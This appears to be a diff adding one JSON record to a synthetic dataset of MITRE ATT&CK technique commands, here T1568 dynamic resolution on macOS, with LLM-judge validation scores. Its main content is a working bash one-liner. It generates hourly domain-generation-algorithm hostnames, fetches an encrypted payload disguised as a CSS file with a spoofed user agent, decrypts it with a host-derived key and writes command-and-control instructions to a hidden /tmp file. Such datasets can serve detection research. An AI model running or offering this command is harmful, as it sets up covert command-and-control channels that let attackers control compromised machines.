@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1568",
+  "platform": "macOS",
+  "shell": "bash",
+  "command": "seed=\"$(hostname)$(date -u +%Y%m%d)\"; key=$(echo -n \"$seed\" | md5 -q); dga=\"$(echo -n \"$(date -u +%Y%m%d%H)\" | md5 -q | cut -c1-10).static-cdn-assets.com\"; ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15\"; wget -qO- --user-agent=\"$ua\" --header=\"Accept: text/css,*/*;q=0.1\" --timeout=10 \"http://$dga/css/theme.css\" | /usr/bin/openssl enc -aes-256-cbc -d -base64 -K \"$key\" -iv \"00000000000000000000000000000000\" > /tmp/.aes_cmd",
+  "explanation": "Combines hourly DGA for dynamic C2 resolution with AES-256-CBC decryption of base64-wrapped instructions, using a key derived from host and date for per-host variability.",
+  "rationale_steps": [
+    "Generate hour-based DGA domain for resilient resolution.",
+    "Fetch encrypted payload via a realistic CSS path and UA.",
+    "Decrypt using OpenSSL AES-256-CBC and store instructions locally."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-6ea66e0e-30dbd482",
+  "source_prompt_hash": "6ea66e0e",
+  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct syntax for variable assignments, command substitutions, and piping.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by using a deterministic DGA algorithm based on date and hostname to generate domain names that change hourly, fetching encrypted C2 instructions that are decrypted with a host-specific key.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:40:34.104401Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, correct command separators, valid flag formats, and standard utilities for macOS bash.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively implements a daily-keyed, hourly-rotating DGA for C2 resolution and decryption using `wget` and `openssl`, though the use of a 128-bit MD5 hash for an AES-256-CBC key is a cryptographic weakness/mismatch, slightly diminishing its full claim alignment.",
+        "combined_score": 4.5,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T07:40:54.018729Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed bash with balanced quoting, valid options, correct separators, and a coherent pipeline.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically generates hourly domains and retrieves/decrypts payload as described, but relies on wget (not default on macOS) and uses an MD5-derived 128-bit key with aes-256-cbc which may be incompatible without padding.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T07:41:12.285692Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
